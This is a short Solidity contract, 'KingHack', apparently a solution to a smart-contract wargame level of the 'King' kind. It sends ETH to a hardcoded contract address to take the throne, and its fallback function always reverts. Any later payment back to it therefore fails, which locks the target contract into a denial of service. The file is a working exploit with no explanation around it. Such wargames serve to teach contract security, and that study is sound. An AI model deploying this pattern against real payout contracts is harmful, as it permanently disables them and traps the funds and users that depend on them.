// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract KingHack {
    address payable king = 0x1bF820Edfcb7472f414072CA8BC61d1B5B774be3;

    function transferETH() public payable {
        (bool success, ) = king.call{value: msg.value}("");
        require(success);
    }

    fallback() external {
        revert();
    }
}